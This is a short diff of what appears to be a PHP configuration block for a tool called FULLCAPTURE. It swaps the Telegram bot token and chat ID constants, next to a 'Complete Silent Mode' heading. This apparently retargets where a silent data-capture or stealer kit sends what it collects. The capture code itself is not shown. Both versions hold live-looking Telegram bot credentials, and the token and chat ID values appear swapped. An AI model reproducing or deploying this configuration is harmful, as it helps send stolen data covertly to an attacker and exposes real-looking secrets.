@@ -8,8 +8,8 @@
 // ============================================
 // CONFIGURATION
 // ============================================
-define('FULLCAPTURE_TELEGRAM_TOKEN', '7319274794');
-define('FULLCAPTURE_TELEGRAM_CHAT_ID', '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w');
+define('FULLCAPTURE_TELEGRAM_TOKEN', '7958019961');
+define('FULLCAPTURE_TELEGRAM_CHAT_ID', '8593050317:AAH5qQs2BXtzp0gA96VGNITvBsoOLQSrJlg');
 define('FULLCAPTURE_VERSION', '17.1.0');
 
 // Complete Silent Mode
